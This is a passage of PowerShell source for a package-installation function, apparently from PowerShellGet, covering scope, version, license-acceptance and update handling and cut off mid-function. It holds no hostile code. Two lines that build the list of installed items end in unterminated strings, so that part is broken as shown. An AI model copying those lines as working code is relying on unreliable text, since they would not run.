function Install-PackageUtility
{
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $FastPackageReference,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]
        $Location,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        $request
    )

    Set-ModuleSourcesVariable

    Write-Debug ($LocalizedData.ProviderApiDebugMessage -f ('Install-PackageUtility'))

    Write-Debug ($LocalizedData.FastPackageReference -f $fastPackageReference)

    $Force = $false
    $SkipPublisherCheck = $false
    $AllowClobber = $false
    $Debug = $false
    $MinimumVersion = ""
    $RequiredVersion = ""
    $IsSavePackage = $false
    $Scope = $null
    $NoPathUpdate = $false
    $AcceptLicense = $false

    
    $parts = $fastPackageReference -Split '[|]'

    if( $parts.Length -eq 5 )
    {
        $providerName = $parts[0]
        $packageName = $parts[1]
        $version = $parts[2]
        $sourceLocation= $parts[3]
        $artifactType = $parts[4]

        $result = ValidateAndGet-VersionPrereleaseStrings -Version $version -CallerPSCmdlet $PSCmdlet
        if (-not $result)
        {
            
            
            return
        }
        $galleryItemVersion = $result["Version"]
        $galleryItemPrerelease = $result["Prerelease"]
        $galleryItemFullVersion = $result["FullVersion"]

        
        $scriptDestination = $script:ProgramFilesScriptsPath
        $moduleDestination = $script:programFilesModulesPath
        $Scope = 'AllUsers'

        if($artifactType -eq $script:PSArtifactTypeScript)
        {
            $AdminPrivilegeErrorMessage = $LocalizedData.InstallScriptAdminPrivilegeRequiredForAllUsersScope -f @($script:ProgramFilesScriptsPath, $script:MyDocumentsScriptsPath)
            $AdminPrivilegeErrorId = 'InstallScriptAdminPrivilegeRequiredForAllUsersScope'
        }
        else
        {
            $AdminPrivilegeErrorMessage = $LocalizedData.InstallModuleAdminPrivilegeRequiredForAllUsersScope -f @($script:programFilesModulesPath, $script:MyDocumentsModulesPath)
            $AdminPrivilegeErrorId = 'InstallModuleAdminPrivilegeRequiredForAllUsersScope'
        }

        $installUpdate = $false

        $options = $request.Options

        if($options)
        {
            foreach( $o in $options.Keys )
            {
                Write-Debug ("OPTION: {0} => {1}" -f ($o, $request.Options[$o]) )
            }

            if($options.ContainsKey('Scope'))
            {
                $Scope = $options['Scope']
                Write-Verbose ($LocalizedData.SpecifiedInstallationScope -f $Scope)

                if($Scope -eq "CurrentUser")
                {
                    $scriptDestination = $script:MyDocumentsScriptsPath
                    $moduleDestination = $script:MyDocumentsModulesPath
                }
                elseif($Scope -eq "AllUsers")
                {
                    $scriptDestination = $script:ProgramFilesScriptsPath
                    $moduleDestination = $script:programFilesModulesPath

                    if(-not (Test-RunningAsElevated))
                    {
                        
                        ThrowError -ExceptionName "System.ArgumentException" `
                                    -ExceptionMessage $AdminPrivilegeErrorMessage `
                                    -ErrorId $AdminPrivilegeErrorId `
                                    -CallerPSCmdlet $PSCmdlet `
                                    -ErrorCategory InvalidArgument
                    }
                }
            }
            elseif($Location)
            {
                $IsSavePackage = $true
                $Scope = $null

                $moduleDestination = $Location
                $scriptDestination = $Location
            }
            elseif(-not $script:IsCoreCLR -and (Test-RunningAsElevated))
            {
                
                $scriptDestination = $script:ProgramFilesScriptsPath
                $moduleDestination = $script:ProgramFilesModulesPath
            }
            else
            {
                
                $scriptDestination = $script:MyDocumentsScriptsPath
                $moduleDestination = $script:MyDocumentsModulesPath
            }

            if($options.ContainsKey('SkipPublisherCheck'))
            {
                $SkipPublisherCheck = $options['SkipPublisherCheck']

                if($SkipPublisherCheck.GetType().ToString() -eq 'System.String')
                {
                    if($SkipPublisherCheck -eq 'true')
                    {
                        $SkipPublisherCheck = $true
                    }
                    else
                    {
                        $SkipPublisherCheck = $false
                    }
                }
            }

            if($options.ContainsKey('AllowClobber'))
            {
                $AllowClobber = $options['AllowClobber']

                if($AllowClobber.GetType().ToString() -eq 'System.String')
                {
                    if($AllowClobber -eq 'false')
                    {
                        $AllowClobber = $false
                    }
                    elseif($AllowClobber -eq 'true')
                    {
                        $AllowClobber = $true
                    }
                }
            }

            if($options.ContainsKey('Force'))
            {
                $Force = $options['Force']

                if($Force.GetType().ToString() -eq 'System.String')
                {
                    if($Force -eq 'false')
                    {
                        $Force = $false
                    }
                    elseif($Force -eq 'true')
                    {
                        $Force = $true
                    }
                }
            }

            if($options.ContainsKey('AcceptLicense'))
            {
                $AcceptLicense = $options['AcceptLicense']

                if($AcceptLicense.GetType().ToString() -eq 'System.String')
                {
                    if($AcceptLicense -eq 'false')
                    {
                        $AcceptLicense = $false
                    }
                    elseif($AcceptLicense -eq 'true')
                    {
                        $AcceptLicense = $true
                    }
                }
            }

            if($options.ContainsKey('Debug'))
            {
                $Debug = $options['Debug']

                if($Debug.GetType().ToString() -eq 'System.String')
                {
                    if($Debug -eq 'false')
                    {
                        $Debug = $false
                    }
                    elseif($Debug -eq 'true')
                    {
                        $Debug = $true
                    }
                }
            }

            if($options.ContainsKey('NoPathUpdate'))
            {
                $NoPathUpdate = $options['NoPathUpdate']

                if($NoPathUpdate.GetType().ToString() -eq 'System.String')
                {
                    if($NoPathUpdate -eq 'false')
                    {
                        $NoPathUpdate = $false
                    }
                    elseif($NoPathUpdate -eq 'true')
                    {
                        $NoPathUpdate = $true
                    }
                }
            }

            if($options.ContainsKey('MinimumVersion'))
            {
                $MinimumVersion = $options['MinimumVersion']
            }

            if($options.ContainsKey('RequiredVersion'))
            {
                $RequiredVersion = $options['RequiredVersion']
            }

            if($options.ContainsKey('InstallUpdate'))
            {
                $installUpdate = $options['InstallUpdate']

                if($installUpdate.GetType().ToString() -eq 'System.String')
                {
                    if($installUpdate -eq 'false')
                    {
                        $installUpdate = $false
                    }
                    elseif($installUpdate -eq 'true')
                    {
                        $installUpdate = $true
                    }
                }
            }

            if($Scope -and ($artifactType -eq $script:PSArtifactTypeScript) -and (-not $installUpdate))
            {
                ValidateAndSet-PATHVariableIfUserAccepts -Scope $Scope `
                                                         -ScopePath $scriptDestination `
                                                         -Request $request `
                                                         -NoPathUpdate:$NoPathUpdate `
                                                         -Force:$Force
            }

            if($artifactType -eq $script:PSArtifactTypeModule)
            {
                $message = $LocalizedData.ModuleDestination -f @($moduleDestination)
            }
            else
            {
                $message = $LocalizedData.ScriptDestination -f @($scriptDestination, $moduleDestination)
            }
            Write-Verbose $message
        }

        Write-Debug "ArtifactType is $artifactType"

        if($artifactType -eq $script:PSArtifactTypeModule)
        {
            
            $InstalledModuleInfo = if(-not $IsSavePackage){ Test-ModuleInstalled -Name $packageName -RequiredVersion $RequiredVersion }

            if(-not $Force -and $InstalledModuleInfo)
            {
                $installedModPrerelease = $null
                if ((Get-Member -InputObject $InstalledModuleInfo -Name PrivateData -ErrorAction SilentlyContinue) -and `
                    $InstalledModuleInfo.PrivateData -and `
                    $InstalledModuleInfo.PrivateData.GetType().ToString() -eq "System.Collections.Hashtable" -and `
                    ($InstalledModuleInfo.PrivateData.ContainsKey('PSData')) -and `
                    $InstalledModuleInfo.PrivateData.PSData.GetType().ToString() -eq "System.Collections.Hashtable" -and `
                    ($InstalledModuleInfo.PrivateData.PSData.ContainsKey('Prerelease')))
                {
                    $installedModPrerelease = $InstalledModuleInfo.PrivateData.PSData.Prerelease
                }

                $result = ValidateAndGet-VersionPrereleaseStrings -Version $InstalledModuleInfo.Version -Prerelease $installedModPrerelease -CallerPSCmdlet $PSCmdlet
                if (-not $result)
                {
                    
                    
                    return
                }
                $installedModuleVersion = $result["Version"]
                $installedModulePrerelease = $result["Prerelease"]
                $installedModuleFullVersion = $result["FullVersion"]

                if($RequiredVersion -and (Test-ModuleSxSVersionSupport))
                {
                    
                    if($InstalledModuleInfo)
                    {
                        $message = $LocalizedData.ModuleWithRequiredVersionAlreadyInstalled -f ($InstalledModuleInfo.Version, $InstalledModuleInfo.Name, $InstalledModuleInfo.ModuleBase, $InstalledModuleInfo.Version)
                        Write-Error -Message $message -ErrorId "ModuleWithRequiredVersionAlreadyInstalled" -Category InvalidOperation
                        return
                    }
                }
                else
                {
                    if(-not $installUpdate)
                    {
                        if ($MinimumVersion)
                        {
                            $result = ValidateAndGet-VersionPrereleaseStrings -Version $MinimumVersion -CallerPSCmdlet $PSCmdlet
                            if (-not $result)
                            {
                                
                                
                                return
                            }
                            $minVersion = $result["Version"]
                            $minPrerelease = $result["Prerelease"]
                            $minFullVersion = $result["FullVersion"]
                        }
                        else
                        {
                            $minVersion = $null
                            $minPrerelease = $null
                            $minFullVersion = $null
                        }

                        if( (-not $MinimumVersion -and ($galleryItemFullVersion -ne $InstalledModuleFullVersion)) -or
                            ($MinimumVersion -and (Compare-PrereleaseVersions -FirstItemVersion $installedModuleVersion `
                                                                              -FirstItemPrerelease $installedModulePrerelease `
                                                                              -SecondItemVersion $minVersion `
                                                                              -SecondItemPrerelease $minPrerelease)))
                        {
                            if($PSVersionTable.PSVersion -ge '5.0.0')
                            {
                                $message = $LocalizedData.ModuleAlreadyInstalledSxS -f ($InstalledModuleFullVersion, $InstalledModuleInfo.Name, $InstalledModuleInfo.ModuleBase, $galleryItemFullVersion, $InstalledModuleFullVersion, $galleryItemFullVersion)
                            }
                            else
                            {
                                $message = $LocalizedData.ModuleAlreadyInstalled -f ($InstalledModuleFullVersion, $InstalledModuleInfo.Name, $InstalledModuleInfo.ModuleBase, $InstalledModuleFullVersion, $galleryItemFullVersion)
                            }
                            Write-Error -Message $message -ErrorId "ModuleAlreadyInstalled" -Category InvalidOperation
                        }
                        else
                        {
                            $message = $LocalizedData.ModuleAlreadyInstalledVerbose -f ($InstalledModuleFullVersion, $InstalledModuleInfo.Name, $InstalledModuleInfo.ModuleBase)
                            Write-Verbose $message
                        }

                        return
                    }
                    else
                    {
                        if (Compare-PrereleaseVersions -FirstItemVersion $installedModuleVersion `
                                                       -FirstItemPrerelease $installedModulePrerelease `
                                                       -SecondItemVersion $galleryItemVersion.ToString() `
                                                       -SecondItemPrerelease $galleryItemPrerelease)
                        {
                            $message = $LocalizedData.FoundModuleUpdate -f ($InstalledModuleInfo.Name, $galleryItemFullVersion)
                            Write-Verbose $message
                        }
                        else
                        {
                            $message = $LocalizedData.NoUpdateAvailable -f ($InstalledModuleInfo.Name)
                            Write-Verbose $message
                            return
                        }
                    }
                }
            }
        }

        if($artifactType -eq $script:PSArtifactTypeScript)
        {
            
            $InstalledScriptInfo = if(-not $IsSavePackage){ Test-ScriptInstalled -Name $packageName }

            Write-Debug "InstalledScriptInfo is $InstalledScriptInfo"

            if(-not $Force -and $InstalledScriptInfo)
            {
                $result = ValidateAndGet-VersionPrereleaseStrings -Version $InstalledScriptInfo.Version -CallerPSCmdlet $PSCmdlet
                if (-not $result)
                {
                    
                    
                    return
                }
                $installedScriptInfoVersion = $result["Version"]
                $installedScriptInfoPrerelease = $result["Prerelease"]
                $installedScriptFullVersion = $result["FullVersion"]

                if(-not $installUpdate)
                {
                    if ($MinimumVersion)
                    {
                        $result = ValidateAndGet-VersionPrereleaseStrings -Version $MinimumVersion -CallerPSCmdlet $PSCmdlet
                        if (-not $result)
                        {
                            
                            
                            return
                        }
                        $minVersion = $result["Version"]
                        $minPrerelease = $result["Prerelease"]
                        $minFullVersion = $result["FullVersion"]
                    }
                    else
                    {
                        $minVersion = $null
                        $minPrerelease = $null
                        $minFullVersion = $null
                    }


                    if( (-not $MinimumVersion -and ($galleryItemFullVersion -ne $installedScriptFullVersion)) -or
                        ($MinimumVersion -and (Compare-PrereleaseVersions -FirstItemVersion $installedScriptInfoVersion `
                                                                          -FirstItemPrerelease $installedScriptInfoPrerelease `
                                                                          -SecondItemVersion $minVersion `
                                                                          -SecondItemPrerelease $minPrerelease) ))
                    {
                        $message = $LocalizedData.ScriptAlreadyInstalled -f ($installedScriptFullVersion, $InstalledScriptInfo.Name, $InstalledScriptInfo.ScriptBase, $installedScriptFullVersion, $galleryItemFullVersion)
                        Write-Error -Message $message -ErrorId "ScriptAlreadyInstalled" -Category InvalidOperation
                    }
                    else
                    {
                        $message = $LocalizedData.ScriptAlreadyInstalledVerbose -f ($installedScriptFullVersion, $InstalledScriptInfo.Name, $InstalledScriptInfo.ScriptBase)
                        Write-Verbose $message
                    }

                    return
                }
                else
                {
                    if (Compare-PrereleaseVersions -FirstItemVersion $installedScriptInfoVersion.ToString() `
                                                   -FirstItemPrerelease $installedScriptInfoPrerelease `
                                                   -SecondItemVersion $galleryItemVersion.ToString() `
                                                   -SecondItemPrerelease $galleryItemPrerelease)
                    {
                        $message = $LocalizedData.FoundScriptUpdate -f ($InstalledScriptInfo.Name, $version)
                        Write-Verbose $message
                    }
                    else
                    {
                        $message = $LocalizedData.NoScriptUpdateAvailable -f ($InstalledScriptInfo.Name)
                        Write-Verbose $message
                        return
                    }
                }
            }

            
            if(-not $installUpdate -and
               -not $IsSavePackage -and
               -not $Force)
            {
                $cmd = Microsoft.PowerShell.Core\Get-Command -Name $packageName `
                                                             -ErrorAction Ignore `
                                                             -WarningAction SilentlyContinue
                if($cmd)
                {
                    $message = $LocalizedData.CommandAlreadyAvailable -f ($packageName)
                    Write-Error -Message $message -ErrorId CommandAlreadyAvailableWitScriptName -Category InvalidOperation
                    return
                }
            }
        }

        
        $tempDestination = Microsoft.PowerShell.Management\Join-Path -Path $script:TempPath -ChildPath "$(Microsoft.PowerShell.Utility\Get-Random)"
        $null = Microsoft.PowerShell.Management\New-Item -Path $tempDestination -ItemType Directory -Force -Confirm:$false -WhatIf:$false

        try
        {
            $provider = $request.SelectProvider($providerName)
            if(-not $provider)
            {
                Write-Error -Message ($LocalizedData.PackageManagementProviderIsNotAvailable -f $providerName)
                return
            }

            if($request.IsCanceled)
            {
                return
            }

            Write-Verbose ($LocalizedData.SpecifiedLocationAndOGP -f ($provider.ProviderName, $providerName))

            $InstalledItemsList = $null
            $pkg = $script:FastPackRefHashtable[$fastPackageReference]

            
            
            if($pkg.Dependencies.count -and
               -not $IsSavePackage -and
               -not $Force)
            {
                $InstalledItemsList = Microsoft.PowerShell.Core\Get-Module -ListAvailable |
                                        Microsoft.PowerShell.Core\ForEach-Object {"$($_.Name)!

                if($artifactType -eq $script:PSArtifactTypeScript)
                {
                    $InstalledItemsList += $script:PSGetInstalledScripts.GetEnumerator() |
                                               Microsoft.PowerShell.Core\ForEach-Object {
                                                   "$($_.Value.PSGetItemInfo.Name)!
                                               }
                }

                $InstalledItemsList | Select-Object -Unique -ErrorAction Ignore

                if($Debug)
                {
                    $InstalledItemsList | Microsoft.PowerShell.Core\ForEach-Object { Write-Debug -Message "Locally available Item: $_"}
                }
            }

            $ProviderOptions = @{
                                    Destination=$tempDestination;
                                }

            if($InstalledItemsList)
            {
                $ProviderOptions['InstalledPackages'] = $InstalledItemsList
            }

            $newRequest = $request.CloneRequest( $ProviderOptions, @($SourceLocation), $request.Credential )

            if($artifactType -eq $script:PSArtifactTypeModule)
            {
                $message = $LocalizedData.DownloadingModuleFromGallery -f ($packageName, $galleryItemFullVersion, $sourceLocation)
            }
            else
            {
                $message = $LocalizedData.DownloadingScriptFromGallery -f ($packageName, $galleryItemFullVersion, $sourceLocation)
            }
            Write-Verbose $message

            $installedPkgs = $provider.InstallPackage($script:FastPackRefHashtable[$fastPackageReference], $newRequest)

            $YesToAll = $false
            $NoToAll = $false
           
            foreach($pkg in $installedPkgs)
            {
                if($request.IsCanceled)
                {
                    return
                }

                $result = ValidateAndGet-VersionPrereleaseStrings -Version $pkg.Version -CallerPSCmdlet $PSCmdlet
                if (-not $result)
                {
                    
                    
                    return
                }
                $pkgVersion = $result["Version"]
                $pkgPrerelease = $result["Prerelease"]
                $pkgFullVersion = $result["FullVersion"]

                $destinationModulePath = Microsoft.PowerShell.Management\Join-Path -Path $moduleDestination -ChildPath $pkg.Name

                
                
                if(Test-ModuleSxSVersionSupport)
                {
                    $destinationModulePath = Microsoft.PowerShell.Management\Join-Path -Path $destinationModulePath -ChildPath $pkgVersion
                }

                $destinationscriptPath = $scriptDestination

                
                $packageType = $script:PSArtifactTypeModule
                $installLocation = $destinationModulePath
                
                $tempPackagePath = Microsoft.PowerShell.Management\Join-Path -Path $tempDestination -ChildPath "$($pkg.Name).$($pkg.Version)"
                if(-not (Microsoft.PowerShell.Management\Test-Path -Path $tempPackagePath -PathType Container))
                {
                    $message = $LocalizedData.UnableToDownloadThePackage -f ($provider.ProviderName, $pkg.Name, $pkg.Version, $tempPackagePath)
                    Write-Error -Message $message -ErrorId 'UnableToDownloadThePackage' -Category InvalidOperation
                    return
                }

                $packageFiles = Microsoft.PowerShell.Management\Get-ChildItem -Path $tempPackagePath -Recurse -Exclude "*.nupkg","*.nuspec"

                if($packageFiles -and $packageFiles.GetType().ToString() -eq 'System.IO.FileInfo' -and $packageFiles.Name -eq "$($pkg.Name).ps1")
                {
                    $packageType = $script:PSArtifactTypeScript
                    $installLocation = $destinationscriptPath
                }

                $AdditionalParams = @{}

                if(-not $IsSavePackage)
                {
                    
                    
                    
                    
                    
                    
                    
                    
                    $InstalledDate = Microsoft.PowerShell.Utility\Get-Date

                    if($installUpdate)
                    {
                        $AdditionalParams['UpdatedDate'] = Microsoft.PowerShell.Utility\Get-Date

                        $InstalledItemDetails = $null
                        if($packageType -eq $script:PSArtifactTypeModule)
                        {
                            $InstalledItemDetails = Get-InstalledModuleDetails -Name $pkg.Name | Select-Object -Last 1 -ErrorAction Ignore
                        }
                        elseif($packageType -eq $script:PSArtifactTypeScript)
                        {
                            $InstalledItemDetails = Get-InstalledScriptDetails -Name $pkg.Name | Select-Object -Last 1 -ErrorAction Ignore
                        }

                        if($InstalledItemDetails -and
                           $InstalledItemDetails.PSGetItemInfo -and
                           (Get-Member -InputObject $InstalledItemDetails.PSGetItemInfo -Name 'InstalledDate') -and
                           $InstalledItemDetails.PSGetItemInfo.InstalledDate)
                        {
                            $InstalledDate = $InstalledItemDetails.PSGetItemInfo.InstalledDate
                        }
                    }

                    $AdditionalParams['InstalledDate'] = $InstalledDate
                }

                
                $psgItemInfo = New-PSGetItemInfo -SoftwareIdentity $pkg `
                                                 -PackageManagementProviderName $provider.ProviderName `
                                                 -SourceLocation $sourceLocation `
                                                 -Type $packageType `
                                                 -InstalledLocation $installLocation `
                                                 @AdditionalParams

                if($packageType -eq $script:PSArtifactTypeModule)
                {
                    if ($psgItemInfo.PowerShellGetFormatVersion -and
                        ($script:SupportedPSGetFormatVersionMajors -notcontains $psgItemInfo.PowerShellGetFormatVersion.Major))
                    {
                        $message = $LocalizedData.NotSupportedPowerShellGetFormatVersion -f ($psgItemInfo.Name, $psgItemInfo.PowerShellGetFormatVersion, $psgItemInfo.Name)
                        Write-Error -Message $message -ErrorId "NotSupportedPowerShellGetFormatVersion" -Category InvalidOperation
                        continue
                    }

                    $sourceModulePath = $tempPackagePath
                    if($psgItemInfo.PowerShellGetFormatVersion -eq "1.0")
                    {
                        $sourceModulePath = Microsoft.PowerShell.Management\Join-Path -Path $sourceModulePath -ChildPath 'Content' |
                            Microsoft.PowerShell.Management\Join-Path -ChildPath '*' |
                                Microsoft.PowerShell.Management\Join-Path -ChildPath $script:ModuleReferences |
                                    Microsoft.PowerShell.Management\Join-Path -ChildPath $pkg.Name
                    }

                    
                    $requireLicenseAcceptance = $false
                    if($psgItemInfo.PowerShellGetFormatVersion -and
                       $psgItemInfo.PowerShellGetFormatVersion -ge $script:PSGetRequireLicenseAcceptanceFormatVersion)
                     {
                        if($psgItemInfo.AdditionalMetadata -and $psgItemInfo.AdditionalMetadata.requireLicenseAcceptance)
                        {
                              $requireLicenseAcceptance = $psgItemInfo.AdditionalMetadata.requireLicenseAcceptance
                        }
                    }

                    if($requireLicenseAcceptance -eq $true)
                    {
                        if($Force -and -not($AcceptLicense))
                        {
                            $message = $LocalizedData.ForceAcceptLicense -f $pkg.Name

                            ThrowError -ExceptionName "System.ArgumentException" `
                                       -ExceptionMessage $message `
                                       -ErrorId "ForceAcceptLicense" `
                                       -CallerPSCmdlet $PSCmdlet `
                                       -ErrorCategory InvalidArgument
                        }

                        If (-not ($YesToAll -or $NoToAll -or $AcceptLicense))
                        {
                            $LicenseFilePath = Join-PathUtility -Path $sourceModulePath -ChildPath 'License.txt' -PathType File
                            if(-not(Test-Path -Path $LicenseFilePath -PathType Leaf))
                            {
                                $message = $LocalizedData.LicenseTxtNotFound

                                ThrowError -ExceptionName "System.ArgumentException" `
                                           -ExceptionMessage $message `
                                           -ErrorId "LicenseTxtNotFound" `
                                           -CallerPSCmdlet $PSCmdlet `
                                           -ErrorCategory ObjectNotFound
                            }
                            $FormattedEula = (Get-Content -Path $LicenseFilePath) -Join "`r`n"
                            $message = $FormattedEula + "`r`n" + ($LocalizedData.AcceptanceLicenseQuery -f $pkg.Name)
                            $title = $LocalizedData.AcceptLicense
                            $result = $request.ShouldContinue($message, $title, [ref]$yesToAll, [ref]$NoToAll)
                            if(($result -eq $false) -or ($NoToAll -eq $true))
                            {
                                Write-Warning -Message $LocalizedData.UserDeclinedLicenseAcceptance
                                return
                            }
                        }
                    }

                    $CurrentModuleInfo = $null

                    
                    if(-not $IsSavePackage)
                    {
                        $CurrentModuleInfo = Test-ValidManifestModule -ModuleBasePath $sourceModulePath `
                                                                      -ModuleName $pkg.Name `
                                                                      -InstallLocation $InstallLocation `
                                                                      -AllowClobber:$AllowClobber `
                                                                      -SkipPublisherCheck:$SkipPublisherCheck `
                                                                      -IsUpdateOperation:$installUpdate

                        if(-not $CurrentModuleInfo)
                        {
                            Write-Verbose -Message ($LocalizedData.ModuleValidationFailed -f $ModuleName,$ModuleBasePath)
                            
                            
                            
                            return
                        }
                    }

                    
                    $InstalledModuleInfo2 = if(-not $IsSavePackage){ Test-ModuleInstalled -Name $pkg.Name -RequiredVersion $pkgFullVersion }

                    if($pkg.Name -ne $packageName)
                    {
                        if(-not $Force -and $InstalledModuleInfo2)
                        {
                            $result = ValidateAndGet-VersionPrereleaseStrings -Version $InstalledModuleInfo2.Version -CallerPSCmdlet $PSCmdlet
                            if (-not $result)
                            {
                                
                                
                                return
                            }
                            $installedModuleVersion = $result["Version"]
                            $installedModulePrerelease = $result["Prerelease"]
                            $installedModuleFullVersion = $result["FullVersion"]

                            if(Test-ModuleSxSVersionSupport)
                            {
                                if($pkgFullVersion -eq $installedModuleFullVersion)
                                {
                                    if(-not $installUpdate)
                                    {
                                        $message = $LocalizedData.ModuleWithRequiredVersionAlreadyInstalled -f ($installedModuleFullVersion, $InstalledModuleInfo2.Name, $InstalledModuleInfo2.ModuleBase, $InstalledModuleFullVersion)
                                    }
                                    else
                                    {
                                        $message = $LocalizedData.NoUpdateAvailable -f ($pkg.Name)
                                    }

                                    Write-Verbose $message
                                    Continue
                                }
                            }
                            else
                            {
                                if(-not $installUpdate)
                                {
                                    $message = $LocalizedData.ModuleAlreadyInstalledVerbose -f ($InstalledModuleFullVersion, $InstalledModuleInfo2.Name, $InstalledModuleInfo2.ModuleBase)
                                    Write-Verbose $message
                                    Continue
                                }
                                else
                                {
                                    if(Compare-PrereleaseVersions -FirstItemVersion $installedModuleVersion.ToString() `
                                                                  -FirstItemPrerelease $installedModPrerelease `
                                                                  -SecondItemVersion $pkgVersion.ToString() `
                                                                  -SecondItemPrerelease $pkgPrerelease)
                                    {
                                        $message = $LocalizedData.FoundModuleUpdate -f ($pkg.Name, $pkgFullVersion)
                                        Write-Verbose $message
                                    }
                                    else
                                    {
                                        $message = $LocalizedData.NoUpdateAvailable -f ($pkg.Name)
                                        Write-Verbose $message
                                        Continue
                                    }
                                }
                            }
                        }

                        if($IsSavePackage)
                        {
                            $DependencyInstallMessage = $LocalizedData.SavingDependencyModule -f ($pkg.Name, $pkgFullVersion, $packageName)
                        }
                        else
                        {
                            $DependencyInstallMessage = $LocalizedData.InstallingDependencyModule -f ($pkg.Name, $pkgFullVersion, $packageName)
                        }

                        Write-Verbose  $DependencyInstallMessage
                    }

                    
                    if($InstalledModuleInfo2)
                    {
                        $moduleInUse = Test-ModuleInUse -ModuleBasePath $InstalledModuleInfo2.ModuleBase `
                                                        -ModuleName $InstalledModuleInfo2.Name `
                                                        -ModuleVersion $InstalledModuleInfo2.Version `
                                                        -Verbose:$VerbosePreference `
                                                        -WarningAction $WarningPreference `
                                                        -ErrorAction $ErrorActionPreference `
                                                        -Debug:$DebugPreference

                        if($moduleInUse)
                        {
                            $message = $LocalizedData.ModuleIsInUse -f ($psgItemInfo.Name)
                            Write-Verbose $message
                            continue
                        }
                    }

                    
                    if($CurrentModuleInfo -and (Test-ModuleSxSVersionSupport) -and -not $pkgPrerelease)
                    {
                        $destinationModulePath = Microsoft.PowerShell.Management\Join-Path -Path $moduleDestination -ChildPath $pkg.Name |
                            Microsoft.PowerShell.Management\Join-Path -ChildPath $CurrentModuleInfo.Version
                        $installLocation = $destinationModulePath
                        $psgItemInfo.InstalledLocation = $installLocation
                        $psgItemInfo.Version = $CurrentModuleInfo.Version
                    }

                    Copy-Module -SourcePath $sourceModulePath -DestinationPath $destinationModulePath -PSGetItemInfo $psgItemInfo -IsSavePackage:$IsSavePackage

                    if(-not $IsSavePackage)
                    {
                        
                        $ExternalModuleDependencies = Get-ExternalModuleDependencies -PSModuleInfo $CurrentModuleInfo
                        foreach($ExternalDependency in $ExternalModuleDependencies)
                        {
                            $depModuleInfo = Test-ModuleInstalled -Name $ExternalDependency

                            if(-not $depModuleInfo)
                            {
                                Write-Warning -Message ($LocalizedData.MissingExternallyManagedModuleDependency -f $ExternalDependency,$pkg.Name,$ExternalDependency)
                            }
                            else
                            {
                                Write-Verbose -Message ($LocalizedData.ExternallyManagedModuleDependencyIsInstalled -f $ExternalDependency)
                            }
                        }
                    }

                    if($IsSavePackage)
                    {
                        $message = $LocalizedData.ModuleSavedSuccessfully -f ($psgItemInfo.Name, $installLocation)
                    }
                    else
                    {
                        $message = $LocalizedData.ModuleInstalledSuccessfully -f ($psgItemInfo.Name, $installLocation)
                    }
                    Write-Verbose $message
                }


                if($packageType -eq $script:PSArtifactTypeScript)
                {
                    if ($psgItemInfo.PowerShellGetFormatVersion -and
                        ($script:SupportedPSGetFormatVersionMajors -notcontains $psgItemInfo.PowerShellGetFormatVersion.Major))
                    {
                        $message = $LocalizedData.NotSupportedPowerShellGetFormatVersionScripts -f ($psgItemInfo.Name, $psgItemInfo.PowerShellGetFormatVersion, $psgItemInfo.Name)
                        Write-Error -Message $message -ErrorId "NotSupportedPowerShellGetFormatVersion" -Category InvalidOperation
                        continue
                    }

                    $sourceScriptPath = Join-PathUtility -Path $tempPackagePath -ChildPath "$($pkg.Name).ps1" -PathType File

                    $currentScriptInfo = $null
                    if(-not $IsSavePackage)
                    {
                        
                        $currentScriptInfo = Test-ScriptFileInfo -Path $sourceScriptPath -ErrorAction SilentlyContinue

                        if(-not $currentScriptInfo)
                        {
                            $message = $LocalizedData.InvalidPowerShellScriptFile -f ($pkg.Name)
                            Write-Error -Message $message -ErrorId "InvalidPowerShellScriptFile" -Category InvalidOperation -TargetObject $pkg.Name
                            continue
                        }

                        
                        $psgItemInfo.Version = $currentScriptInfo.Version
                    }

                    
                    $InstalledScriptInfo2 = if(-not $IsSavePackage){ Test-ScriptInstalled -Name $pkg.Name }


                    if($pkg.Name -ne $packageName)
                    {
                        if(-not $Force -and $InstalledScriptInfo2)
                        {
                            $result = ValidateAndGet-VersionPrereleaseStrings -Version $InstalledScriptInfo2.Version -CallerPSCmdlet $PSCmdlet
                            if (-not $result)
                            {
                                
                                
                                return
                            }
                            $installedScriptFullVersion = $result["FullVersion"]

                            if(-not $installUpdate)
                            {
                                $message = $LocalizedData.ScriptAlreadyInstalledVerbose -f ($InstalledScriptFullVersion, $InstalledScriptInfo2.Name, $InstalledScriptInfo2.ScriptBase)
                                Write-Verbose $message
                                Continue
                            }
                            else
                            {
                                if(Compare-PrereleaseVersions -FirstItemVersion $installedScriptInfoVersion.ToString() `
                                                              -FirstItemPrerelease $installedScriptInfoPrerelease `
                                                              -SecondItemVersion $pkgVersion `
                                                              -SecondItemPrerelease $pkgPrerelease)
                                {
                                    $message = $LocalizedData.FoundScriptUpdate -f ($pkg.Name, $pkgFullVersion)
                                    Write-Verbose $message
                                }
                                else
                                {
                                    $message = $LocalizedData.NoScriptUpdateAvailable -f ($pkg.Name)
                                    Write-Verbose $message
                                    Continue
                                }
                            }
                        }

                        if($IsSavePackage)
                        {
                            $DependencyInstallMessage = $LocalizedData.SavingDependencyScript -f ($pkg.Name, $pkgFullVersion, $packageName)
                        }
                        else
                        {
                            $DependencyInstallMessage = $LocalizedData.InstallingDependencyScript -f ($pkg.Name, $pkgFullVersion, $packageName)
                        }

                        Write-Verbose  $DependencyInstallMessage
                    }

                    Write-Debug "SourceScriptPath is $sourceScriptPath and DestinationscriptPath is $destinationscriptPath"
                    Copy-ScriptFile -SourcePath $sourceScriptPath -DestinationPath $destinationscriptPath -PSGetItemInfo $psgItemInfo -Scope $Scope

                    if(-not $IsSavePackage)
                    {
                        
                        foreach($ExternalDependency in $currentScriptInfo.ExternalModuleDependencies)
                        {
                            $depModuleInfo = Test-ModuleInstalled -Name $ExternalDependency

                            if(-not $depModuleInfo)
                            {
                                Write-Warning -Message ($LocalizedData.ScriptMissingExternallyManagedModuleDependency -f $ExternalDependency,$pkg.Name,$ExternalDependency)
                            }
                            else
                            {
                                Write-Verbose -Message ($LocalizedData.ExternallyManagedModuleDependencyIsInstalled -f $ExternalDependency)
                            }
                        }

                        
                        foreach($ExternalDependency in $currentScriptInfo.ExternalScriptDependencies)
                        {
                            $depScriptInfo = Test-ScriptInstalled -Name $ExternalDependency

                            if(-not $depScriptInfo)
                            {
                                Write-Warning -Message ($LocalizedData.ScriptMissingExternallyManagedScriptDependency -f $ExternalDependency,$pkg.Name,$ExternalDependency)
                            }
                            else
                            {
